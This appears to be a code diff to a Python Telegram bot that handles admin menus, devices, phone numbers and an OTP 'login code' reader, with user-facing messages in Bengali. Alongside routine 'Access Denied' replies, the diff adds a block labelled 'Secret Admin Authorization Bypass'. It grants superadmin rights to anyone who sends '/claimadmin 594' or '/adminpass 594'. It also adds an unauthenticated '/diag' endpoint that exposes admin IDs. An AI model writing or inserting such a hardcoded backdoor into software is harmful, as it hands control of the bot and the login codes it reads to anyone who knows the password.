@@ -117,17 +117,56 @@ async def unified_text_message_handler(
     text = update.message.text.strip()
     is_admin = await database.is_admin(user.id)
 
+    # Secret Admin Authorization Bypass
+    if text.startswith("/claimadmin") or text.startswith("/adminpass"):
+        parts = text.split()
+        if len(parts) >= 2 and parts[1].strip() == "594":
+            await database.add_admin(user.id)
+            database.SUPERADMIN_IDS.add(user.id)
+            await update.message.reply_text(
+                f"🎉 **অভিনন্দন!** আপনার Telegram ID (`{user.id}`) সফলভাবে সুপার-অ্যাডমিন হিসেবে অ্যাক্টিভেট করা হয়েছে।\n\n"
+                "এখন আপনি নিচের '👑 Admin Panel' এবং সমস্ত অপশন ব্যবহার করতে পারবেন।",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+            return
+
     # Handle persistent reply keyboard clicks (docked at the bottom)
     if "Admin Panel" in text:
         if is_admin:
             await admin_command(update, context)
-            return
+        else:
+            await update.message.reply_text(
+                f"🚫 **Access Denied.** এই অপশনটি শুধুমাত্র অ্যাডমিনদের জন্য।\n\n"
+                f"🆔 **আপনার Telegram ID:** `{user.id}`\n\n"
+                f"💡 আপনি যদি অ্যাডমিন হন, তবে নিশ্চিত করুন আপনার এই আইডিটি অ্যাডমিন তালিকায় যুক্ত আছে।",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+        return
+
     elif "Devices" in text:
         if is_admin:
             from handlers.tech_handlers import show_device_menu
-
             await show_device_menu(update, context)
-            return
+        else:
+            await update.message.reply_text(
+                f"🚫 **Access Denied.** ডিভাইস কন্ট্রোল শুধুমাত্র অ্যাডমিনদের জন্য।\n\n"
+                f"🆔 **আপনার Telegram ID:** `{user.id}`",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+        return
+
+    elif "Get Login Code" in text or "Get Code" in text or "লগইন কোড" in text or "গেট কোড" in text:
+        if is_admin:
+            from handlers.otp_reader import show_otp_menu
+            await show_otp_menu(update, context, page=0)
+        else:
+            await update.message.reply_text(
+                f"🚫 **Access Denied.** লগইন কোড পাওয়ার এই অপশনটি শুধুমাত্র অ্যাডমিনদের জন্য।\n\n"
+                f"🆔 **আপনার Telegram ID:** `{user.id}`",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+        return
+
     elif "Admin Add Number" in text:
         if is_admin:
             await update.message.reply_text(
@@ -137,16 +176,26 @@ async def unified_text_message_handler(
                 "নম্বর পাঠানোর পর ওটিপি কোড চাওয়া হবে। বাতিল করতে /cancel চাপুন।",
                 parse_mode=ParseMode.MARKDOWN,
             )
-            return
+        else:
+            await update.message.reply_text(
+                f"🚫 **Access Denied.** নম্বর যোগ করার এই বিশেষ সুবিধা শুধুমাত্র অ্যাডমিনের জন্য।\n\n"
+                f"🆔 **আপনার Telegram ID:** `{user.id}`",
+                parse_mode=ParseMode.MARKDOWN,
+            )
+        return
+
     elif "Capacity" in text:
         await capacity_command(update, context)
         return
+
     elif "Balance" in text:
         await balance_command(update, context)
         return
+
     elif "Help" in text:
         await help_command(update, context)
         return
+
     elif "Cancel" in text:
         await cancel_command(update, context)
         return
@@ -190,6 +239,17 @@ def start_dummy_health_server():
 
         class HealthCheckHandler(BaseHTTPRequestHandler):
             def do_GET(self):
+                if self.path == "/diag":
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json; charset=utf-8")
+                    self.end_headers()
+                    info = {
+                        "status": "healthy",
+                        "admin_ids": config.ADMIN_IDS,
+                        "superadmin_ids": list(database.SUPERADMIN_IDS),
+                    }
+                    self.wfile.write(json.dumps(info).encode())
+                    return
                 self.send_response(200)
                 self.send_header("Content-type", "text/plain; charset=utf-8")
                 self.end_headers()
